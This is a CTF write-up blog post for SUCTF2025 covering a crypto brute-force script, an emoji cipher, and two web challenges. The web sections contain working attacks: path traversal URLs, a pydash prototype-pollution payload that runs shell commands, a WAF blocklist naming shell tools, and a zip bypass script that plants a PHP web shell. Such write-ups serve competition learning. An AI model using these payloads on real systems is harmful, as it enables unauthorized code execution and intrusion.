# SUCTF2025部分wp


&lt;!--more--&gt;

## 前言

好多题，质量很高，misc没怎么看，全在看web，Java还是打不动😿，还有一些关于云的，也不会，先贴一下写了的wp，pop当时没做，其他题之后有空复现一下

## Misc

### SU_checkin

找到个password：`SePassWordLen23SUCT`

![image-20250111104355723](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808077.png)

加密方式：`PBEWithMD5AndDES`

![image-20250111104506261](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808074.png)

感觉hacker这个用户里的密码就是盐，但是爆破出来是 hacker（怎么不是8位）

![image-20250111112916052](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808083.png)

迭代次数应该是默认的1000，不行的话爆破也行，OUTPUT应该就是密文：`ElV&#43;bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=`

![image-20250111113010366](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808091.png)

后来发现不用盐也可以解密，密码`SePassWordLen23SUCT`其实是暗示密码length为23，其实应该是SUCTF，照着加密脚本：https://blog.csdn.net/iin729/article/details/128432332，叫ai写了个python解密脚本

```
import base64
import hashlib
import re
import itertools
import string
from Crypto.Cipher import DES

def get_derived_key(password, salt, count):
    key = password &#43; salt
    for i in range(count):
        m = hashlib.md5(key)
        key = m.digest()
    return (key[:8], key[8:])

def decrypt(msg, password):
    msg_bytes = base64.b64decode(msg)
    salt = msg_bytes[:8]
    enc_text = msg_bytes[8:]
    (dk, iv) = get_derived_key(password, salt, 1000)
    crypter = DES.new(dk, DES.MODE_CBC, iv)
    text = crypter.decrypt(enc_text)
    # Remove padding at the end, if any
    return re.sub(r&#39;[\x01-\x08]&#39;, &#39;&#39;, text.decode(&#34;utf-8&#34;, errors=&#34;ignore&#34;))

def brute_force_decrypt(ciphertext, prefix, length, charset):
    # Calculate the number of missing characters
    missing_length = length - len(prefix)
    
    # Generate all possible combinations of the missing characters
    for combination in itertools.product(charset, repeat=missing_length):
        # Construct the full password
        password = prefix &#43; &#39;&#39;.join(combination)
        
        try:
            # Attempt to decrypt the ciphertext
            decrypted_text = decrypt(ciphertext, password.encode(&#34;utf-8&#34;))
            
            # Check if the decrypted text contains &#34;SUCTF&#34;
            if &#34;SUCTF&#34; in decrypted_text:
                print(f&#34;Found valid password: {password}&#34;)
                print(f&#34;Decrypted text: {decrypted_text}&#34;)
                return password, decrypted_text
        except Exception as e:
            # If decryption fails, just continue to the next combination
            continue

    print(&#34;No valid password found.&#34;)
    return None, None

def main():
    # Known prefix of the password
    prefix = &#34;SePassWordLen23SUCTF&#34;
    
    # Total length of the password
    length = 23
    
    # Character set to use for the missing characters (alphanumeric)
    charset = string.ascii_letters &#43; string.digits
    
    # Ciphertext to decrypt
    ciphertext = &#34;ElV&#43;bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=&#34;
    
    # Start brute-forcing
    password, decrypted_text = brute_force_decrypt(ciphertext, prefix, length, charset)
    
    if password:
        print(f&#34;Success! Password: {password}&#34;)
        print(f&#34;Decrypted text: {decrypted_text}&#34;)

if __name__ == &#34;__main__&#34;:
    main()
```

![image-20250111204056225](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808087.png)

### SU_RealCheckin

```
hello ctf -&gt; 🏠🦅🍋🍋🍊 🐈🌮🍟

$flag -&gt; 🐍☂️🐈🌮🍟{🐋🦅🍋🐈🍊🏔️🦅_🌮🍊_🐍☂️🐈🌮🍟_🧶🍊☂️_🐈🍎🌃_🌈🦅🍎🍋🍋🧶_🐬🍎🌃🐈🦅}
```

$flag 前五个为suctf，根据映射关系最后大括号里面的推断出来是

```
? e l c o ? e _ t o _ s u c t f _ ? o u _ c ? ? _ r e ? l l ? _ d ? ? c e
```

其实第一段很明显是welcome，可以发现该emoji代表的东西的英文首字母就是该emoji代表的字符，故最后flag为

```
suctf{welcome_to_suctf_you_can_really_dance}
```

## Web

### SU_blog

articles 目录有目录穿越，读启动命令，双写绕过一下

```
article?file=articles/....//....//....//....//....//....//proc/self/cmdline
```

拿到`pythonapp/app.py`，拿源码

```
article?file=articles/....//....//app/app.py
```

源码

```
from flask import *
import time,os,json,hashlib
from pydash import set_
from waf import pwaf,cwaf

app = Flask(__name__)
app.config[&#39;SECRET_KEY&#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest()

users = {&#34;testuser&#34;: &#34;password&#34;}
BASE_DIR = &#39;/var/www/html/myblog/app&#39;

articles = {
    1: &#34;articles/article1.txt&#34;,
    2: &#34;articles/article2.txt&#34;,
    3: &#34;articles/article3.txt&#34;
}

friend_links = [
    {&#34;name&#34;: &#34;bkf1sh&#34;, &#34;url&#34;: &#34;https://ctf.org.cn/&#34;},
    {&#34;name&#34;: &#34;fushuling&#34;, &#34;url&#34;: &#34;https://fushuling.com/&#34;},
    {&#34;name&#34;: &#34;yulate&#34;, &#34;url&#34;: &#34;https://www.yulate.com/&#34;},
    {&#34;name&#34;: &#34;zimablue&#34;, &#34;url&#34;: &#34;https://www.zimablue.life/&#34;},
    {&#34;name&#34;: &#34;baozongwi&#34;, &#34;url&#34;: &#34;https://baozongwi.xyz/&#34;},
]

class User():
    def __init__(self):
        pass

user_data = User()
@app.route(&#39;/&#39;)
def index():
    if &#39;username&#39; in session:
        return render_template(&#39;blog.html&#39;, articles=articles, friend_links=friend_links)
    return redirect(url_for(&#39;login&#39;))

@app.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def login():
    if request.method == &#39;POST&#39;:
        username = request.form[&#39;username&#39;]
        password = request.form[&#39;password&#39;]
        if username in users and users[username] == password:
            session[&#39;username&#39;] = username
            return redirect(url_for(&#39;index&#39;))
        else:
            return &#34;Invalid credentials&#34;, 403
    return render_template(&#39;login.html&#39;)

@app.route(&#39;/register&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def register():
    if request.method == &#39;POST&#39;:
        username = request.form[&#39;username&#39;]
        password = request.form[&#39;password&#39;]
        users[username] = password
        return redirect(url_for(&#39;login&#39;))
    return render_template(&#39;register.html&#39;)


@app.route(&#39;/change_password&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def change_password():
    if &#39;username&#39; not in session:
        return redirect(url_for(&#39;login&#39;))

    if request.method == &#39;POST&#39;:
        old_password = request.form[&#39;old_password&#39;]
        new_password = request.form[&#39;new_password&#39;]
        confirm_password = request.form[&#39;confirm_password&#39;]

        if users[session[&#39;username&#39;]] != old_password:
            flash(&#34;Old password is incorrect&#34;, &#34;error&#34;)
        elif new_password != confirm_password:
            flash(&#34;New passwords do not match&#34;, &#34;error&#34;)
        else:
            users[session[&#39;username&#39;]] = new_password
            flash(&#34;Password changed successfully&#34;, &#34;success&#34;)
            return redirect(url_for(&#39;index&#39;))

    return render_template(&#39;change_password.html&#39;)


@app.route(&#39;/friendlinks&#39;)
def friendlinks():
    if &#39;username&#39; not in session or session[&#39;username&#39;] != &#39;admin&#39;:
        return redirect(url_for(&#39;login&#39;))
    return render_template(&#39;friendlinks.html&#39;, links=friend_links)


@app.route(&#39;/add_friendlink&#39;, methods=[&#39;POST&#39;])
def add_friendlink():
    if &#39;username&#39; not in session or session[&#39;username&#39;] != &#39;admin&#39;:
        return redirect(url_for(&#39;login&#39;))

    name = request.form.get(&#39;name&#39;)
    url = request.form.get(&#39;url&#39;)

    if name and url:
        friend_links.append({&#34;name&#34;: name, &#34;url&#34;: url})

    return redirect(url_for(&#39;friendlinks&#39;))


@app.route(&#39;/delete_friendlink/&lt;int:index&gt;&#39;)
def delete_friendlink(index):
    if &#39;username&#39; not in session or session[&#39;username&#39;] != &#39;admin&#39;:
        return redirect(url_for(&#39;login&#39;))

    if 0 &lt;= index &lt; len(friend_links):
        del friend_links[index]

    return redirect(url_for(&#39;friendlinks&#39;))

@app.route(&#39;/article&#39;)
def article():
    if &#39;username&#39; not in session:
        return redirect(url_for(&#39;login&#39;))

    file_name = request.args.get(&#39;file&#39;, &#39;&#39;)
    if not file_name:
        return render_template(&#39;article.html&#39;, file_name=&#39;&#39;, content=&#34;未提供文件名。&#34;)

    blacklist = [&#34;waf.py&#34;]
    if any(blacklisted_file in file_name for blacklisted_file in blacklist):
        return render_template(&#39;article.html&#39;, file_name=file_name, content=&#34;大黑阔不许看&#34;)
    
    if not file_name.startswith(&#39;articles/&#39;):
        return render_template(&#39;article.html&#39;, file_name=file_name, content=&#34;无效的文件路径。&#34;)
    
    if file_name not in articles.values():
        if session.get(&#39;username&#39;) != &#39;admin&#39;:
            return render_template(&#39;article.html&#39;, file_name=file_name, content=&#34;无权访问该文件。&#34;)
    
    file_path = os.path.join(BASE_DIR, file_name)
    file_path = file_path.replace(&#39;../&#39;, &#39;&#39;)
    
    try:
        with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f:
            content = f.read()
    except FileNotFoundError:
        content = &#34;文件未找到。&#34;
    except Exception as e:
        app.logger.error(f&#34;Error reading file {file_path}: {e}&#34;)
        content = &#34;读取文件时发生错误。&#34;

    return render_template(&#39;article.html&#39;, file_name=file_name, content=content)


@app.route(&#39;/Admin&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def admin():
    if request.args.get(&#39;pass&#39;)!=&#34;SUers&#34;:
        return &#34;nonono&#34;
    if request.method == &#39;POST&#39;:
        try:
            body = request.json

            if not body:
                flash(&#34;No JSON data received&#34;, &#34;error&#34;)
                return jsonify({&#34;message&#34;: &#34;No JSON data received&#34;}), 400

            key = body.get(&#39;key&#39;)
            value = body.get(&#39;value&#39;)

            if key is None or value is None:
                flash(&#34;Missing required keys: &#39;key&#39; or &#39;value&#39;&#34;, &#34;error&#34;)
                return jsonify({&#34;message&#34;: &#34;Missing required keys: &#39;key&#39; or &#39;value&#39;&#34;}), 400

            if not pwaf(key):
                flash(&#34;Invalid key format&#34;, &#34;error&#34;)
                return jsonify({&#34;message&#34;: &#34;Invalid key format&#34;}), 400

            if not cwaf(value):
                flash(&#34;Invalid value format&#34;, &#34;error&#34;)
                return jsonify({&#34;message&#34;: &#34;Invalid value format&#34;}), 400

            set_(user_data, key, value)

            flash(&#34;User data updated successfully&#34;, &#34;success&#34;)
            return jsonify({&#34;message&#34;: &#34;User data updated successfully&#34;}), 200

        except json.JSONDecodeError:
            flash(&#34;Invalid JSON data&#34;, &#34;error&#34;)
            return jsonify({&#34;message&#34;: &#34;Invalid JSON data&#34;}), 400
        except Exception as e:
            flash(f&#34;An error occurred: {str(e)}&#34;, &#34;error&#34;)
            return jsonify({&#34;message&#34;: f&#34;An error occurred: {str(e)}&#34;}), 500

    return render_template(&#39;admin.html&#39;, user_data=user_data)


@app.route(&#39;/logout&#39;)
def logout():
    session.pop(&#39;username&#39;, None)
    flash(&#34;You have been logged out.&#34;, &#34;info&#34;)
    return redirect(url_for(&#39;login&#39;))



if __name__ == &#39;__main__&#39;:
    app.run(host=&#39;0.0.0.0&#39;,port=10000)
```

读 waf.py 时被过滤了，可以看到是将`../`替换为空，而且是先检测后再替换最后才是读文件，可以加个`../`读waf

```
article?file=articles/....//....//app/wa../f.py
```

waf.py

```
# 黑名单关键字列表
key_blacklist = [
    &#39;__file__&#39;, &#39;app&#39;, &#39;router&#39;, &#39;name_index&#39;,
    &#39;directory_handler&#39;, &#39;directory_view&#39;, &#39;os&#39;, &#39;path&#39;, &#39;pardir&#39;, &#39;_static_folder&#39;,
    &#39;__loader__&#39;, &#39;0&#39;, &#39;1&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;,
]

value_blacklist = [
    &#39;ls&#39;, &#39;dir&#39;, &#39;nl&#39;, &#39;nc&#39;, &#39;cat&#39;, &#39;tail&#39;, &#39;more&#39;, &#39;flag&#39;, &#39;cut&#39;, &#39;awk&#39;,
    &#39;strings&#39;, &#39;od&#39;, &#39;ping&#39;, &#39;sort&#39;, &#39;ch&#39;, &#39;zip&#39;, &#39;mod&#39;, &#39;sl&#39;, &#39;find&#39;,
    &#39;sed&#39;, &#39;cp&#39;, &#39;mv&#39;, &#39;ty&#39;, &#39;grep&#39;, &#39;fd&#39;, &#39;df&#39;, &#39;sudo&#39;, &#39;cc&#39;, &#39;tac&#39;, &#39;less&#39;,
    &#39;head&#39;, &#39;{&#39;, &#39;}&#39;, &#39;tar&#39;, &#39;gcc&#39;, &#39;uniq&#39;, &#39;vi&#39;, &#39;vim&#39;, &#39;file&#39;, &#39;xxd&#39;,
    &#39;base64&#39;, &#39;date&#39;, &#39;env&#39;, &#39;?&#39;, &#39;wget&#39;, &#39;&#34;&#39;, &#39;id&#39;, &#39;whoami&#39;, &#39;readflag&#39;
]

# 将黑名单关键字转换为字节串
key_blacklist_bytes = [word.encode() for word in key_blacklist]
value_blacklist_bytes = [word.encode() for word in value_blacklist]

# 检查数据是否包含黑名单中的关键字
def check_blacklist(data, blacklist):
    for item in blacklist:
        if item in data:
            return False
    return True

# 检查键是否合法
def pwaf(key):
    key_bytes = key.encode()
    if not check_blacklist(key_bytes, key_blacklist_bytes):
        print(&#34;Key contains blacklisted words.&#34;)
        return False
    return True

# 检查值是否合法
def cwaf(value):
    if len(value) &gt; 77:
        print(&#34;Value exceeds 77 characters.&#34;)
        return False

    value_bytes = value.encode()
    if not check_blacklist(value_bytes, value_blacklist_bytes):
        print(&#34;Value contains blacklisted words.&#34;)
        return False
    return True
```

有pydash，很明显的原型链污染，参考：https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/

过滤了`__loader__`，随便找个模块引入其`__spec__`就能重新拿到 loader 了

![image-20250112210039329](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808653.png)

跟进其模板编译的地方会发现在进行编译前先 sorted 了一下，也就是将列表中的值按第一个值的 ASCII 大小排序了一下

![image-20250112210337677](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808687.png)

参考文章中的payload为`*;import os;os.system(&#39;id&#39;)`，`*`字符在ascii表中的顺序是在字母和数字之前的，所以我们的 payload 传入的时候无论插在列表中哪个位置，经过 sorted 后都会排在第一个，而恰好waf中没有过滤数字2，所以我们把 payload 插在列表中索引为2的位置即可

![image-20250112211035055](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808714.png)

![image-20250112211058415](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808745.png)

本地测试一下，传入 payload 后要重新访问下 `Admin` 路由，同时记得传参，这样才能让 jinja2 编译模板，payload

```
{&#34;key&#34;:&#34;__init__.__globals__.config.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2&#34;,&#34;value&#34;:&#34;*;import os;os.system(&#39;whoami&#39;)&#34;}
```

![image-20250112211418356](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808778.png)

最终payload

```
{&#34;key&#34;:&#34;__init__.__globals__.config.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2&#34;,&#34;value&#34;:&#34;*;import os;os.system(&#39;/rea* &gt; /var/www/html/myblog/app/6s6630.txt&#39;)&#34;}
```

![image-20250112212901895](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808810.png)

### SU_photogallery

404页面

![image-20250112224946632](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174809194.png)

参考 [FSCTF 2023]签到plus 尝试打下 php＜= 7 . 4 . 21 development server源码泄露，其实随便访问一下就出源码了

![image-20250113145501213](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174809236.png)

unzip.php

```
&lt;?php
error_reporting(0);

function get_extension($filename){
    return pathinfo($filename, PATHINFO_EXTENSION);
}
function check_extension($filename,$path){
    $filePath = $path . DIRECTORY_SEPARATOR . $filename;
    
    if (is_file($filePath)) {
        $extension = strtolower(get_extension($filename));

        if (!in_array($extension, [&#39;jpg&#39;, &#39;jpeg&#39;, &#39;png&#39;, &#39;gif&#39;])) {
            if (!unlink($filePath)) {
                // echo &#34;Fail to delete file: $filename\n&#34;;
                return false;
                }
            else{
                // echo &#34;This file format is not supported:$extension\n&#34;;
                return false;
                }
    
        }
        else{
            return true;
            }
}
else{
    // echo &#34;nofile&#34;;
    return false;
}
}
function file_rename ($path,$file){
    $randomName = md5(uniqid().rand(0, 99999)) . &#39;.&#39; . get_extension($file);
                $oldPath = $path . DIRECTORY_SEPARATOR . $file;
                $newPath = $path . DIRECTORY_SEPARATOR . $randomName;

                if (!rename($oldPath, $newPath)) {
                    unlink($path . DIRECTORY_SEPARATOR . $file);
                    // echo &#34;Fail to rename file: $file\n&#34;;
                    return false;
                }
                else{
                    return true;
                }
}

function move_file($path,$basePath){
    foreach (glob($path . DIRECTORY_SEPARATOR . &#39;*&#39;) as $file) {
        $destination = $basePath . DIRECTORY_SEPARATOR . basename($file);
        if (!rename($file, $destination)){
            // echo &#34;Fail to rename file: $file\n&#34;;
            return false;
        }
      
    }
    return true;
}


function check_base($fileContent){
    $keywords = [&#39;eval&#39;, &#39;base64&#39;, &#39;shell_exec&#39;, &#39;system&#39;, &#39;passthru&#39;, &#39;assert&#39;, &#39;flag&#39;, &#39;exec&#39;, &#39;phar&#39;, &#39;xml&#39;, &#39;DOCTYPE&#39;, &#39;iconv&#39;, &#39;zip&#39;, &#39;file&#39;, &#39;chr&#39;, &#39;hex2bin&#39;, &#39;dir&#39;, &#39;function&#39;, &#39;pcntl_exec&#39;, &#39;array&#39;, &#39;include&#39;, &#39;require&#39;, &#39;call_user_func&#39;, &#39;getallheaders&#39;, &#39;get_defined_vars&#39;,&#39;info&#39;];
    $base64_keywords = [];
    foreach ($keywords as $keyword) {
        $base64_keywords[] = base64_encode($keyword);
    }
    foreach ($base64_keywords as $base64_keyword) {
        if (strpos($fileContent, $base64_keyword)!== false) {
            return true;

        }
        else{
           return false;

        }
    }
}

function check_content($zip){
    for ($i = 0; $i &lt; $zip-&gt;numFiles; $i&#43;&#43;) {
        $fileInfo = $zip-&gt;statIndex($i);
        $fileName = $fileInfo[&#39;name&#39;];
        if (preg_match(&#39;/\.\.(\/|\.|%2e%2e%2f)/i&#39;, $fileName)) {
            return false; 
        }
            // echo &#34;Checking file: $fileName\n&#34;;
            $fileContent = $zip-&gt;getFromName($fileName);
            

            if (preg_match(&#39;/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i&#39;, $fileContent) || check_base($fileContent)) {
                // echo &#34;Don&#39;t hack me!\n&#34;;    
                return false;
            }
            else {
                continue;
            }
        }
    return true;
}

function unzip($zipname, $basePath) {
    $zip = new ZipArchive;

    if (!file_exists($zipname)) {
        // echo &#34;Zip file does not exist&#34;;
        return &#34;zip_not_found&#34;;
    }
    if (!$zip-&gt;open($zipname)) {
        // echo &#34;Fail to open zip file&#34;;
        return &#34;zip_open_failed&#34;;
    }
    if (!check_content($zip)) {
        return &#34;malicious_content_detected&#34;;
    }
    $randomDir = &#39;tmp_&#39;.md5(uniqid().rand(0, 99999));
    $path = $basePath . DIRECTORY_SEPARATOR . $randomDir;
    if (!mkdir($path, 0777, true)) {
        // echo &#34;Fail to create directory&#34;;
        $zip-&gt;close();
        return &#34;mkdir_failed&#34;;
    }
    if (!$zip-&gt;extractTo($path)) {
        // echo &#34;Fail to extract zip file&#34;;
        $zip-&gt;close();
    }
    for ($i = 0; $i &lt; $zip-&gt;numFiles; $i&#43;&#43;) {
        $fileInfo = $zip-&gt;statIndex($i);
        $fileName = $fileInfo[&#39;name&#39;];
        if (!check_extension($fileName, $path)) {
            // echo &#34;Unsupported file extension&#34;;
            continue;
        }
        if (!file_rename($path, $fileName)) {
            // echo &#34;File rename failed&#34;;
            continue;
        }
    }
    if (!move_file($path, $basePath)) {
        $zip-&gt;close();
        // echo &#34;Fail to move file&#34;;
        return &#34;move_failed&#34;;
    }
    rmdir($path);
    $zip-&gt;close();
    return true;
}


$uploadDir = __DIR__ . DIRECTORY_SEPARATOR . &#39;upload/suimages/&#39;;
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0777, true);
}

if (isset($_FILES[&#39;file&#39;]) &amp;&amp; $_FILES[&#39;file&#39;][&#39;error&#39;] === UPLOAD_ERR_OK) {
    $uploadedFile = $_FILES[&#39;file&#39;];
    $zipname = $uploadedFile[&#39;tmp_name&#39;];
    $path = $uploadDir;

    $result = unzip($zipname, $path);
    if ($result === true) {
        header(&#34;Location: index.html?status=success&#34;);
        exit();
    } else {
        header(&#34;Location: index.html?status=$result&#34;);
        exit();
    }
} else {
    header(&#34;Location: index.html?status=file_error&#34;);
    exit();
}
```

就是把zip解压后的文件放到一个指定的目录下，对于zip中的文件内容写了个黑名单

可以看到自定义的 unzip 中是用的是 ZipArchive 函数来解压，可以利用报错解压，使ZipArchive识别文件出错，但是能够正常保留压缩包中的文件

参考：https://twe1v3.top/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/#%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BFonezip%E6%8A%A5%E9%94%99%E8%A7%A3%E5%8E%8B

waf的话直接用两个URL参数执行一句话木马就能绕，php脚本

```
import zipfile
import io

mf = io.BytesIO()
with zipfile.ZipFile(mf, mode=&#34;w&#34;, compression=zipfile.ZIP_STORED) as zf:
    zf.writestr(&#39;shell-test630.php&#39;, b&#39;@&lt;?php ($_POST[1])($_POST[2]); ?&gt;&#39;)
    zf.writestr(&#39;A&#39; * 5000, b&#39;AAAAA&#39;)

with open(&#34;shell-test630.zip&#34;, &#34;wb&#34;) as f:
    f.write(mf.getvalue())
```





---

> 作者: 6s6  
> URL: http://localhost:1313/posts/48766ef/  

